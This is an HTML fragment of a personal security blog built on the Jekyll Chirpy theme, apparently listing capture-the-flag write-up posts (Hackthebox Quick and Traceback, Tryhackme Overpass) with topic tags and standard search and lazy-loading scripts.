<!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 27, 2020 <i class="unloaded">2020-08-27T22:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Quick</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div><div class="card"> <a href="/posts/Overpass/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 24, 2020 <i class="unloaded">2020-08-24T07:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Overpass</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div><div class="card"> <a href="/posts/Traceback/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 14, 2020 <i class="unloaded">2020-08-14T22:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Traceback</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <script src="https://www.hackthebox.eu/badge/122977"></script></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ssh/">Ssh</a> <a class="post-tag" href="/tags/cracking/">Cracking</a> <a class="post-tag" href="/tags/php/">Php</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/secretsdump/">Secretsdump</a> <a class="post-tag" href="/tags/reverse-shell/">Reverse Shell</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/mysql/">Mysql</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/kerbrute/">Kerbrute</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '//assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
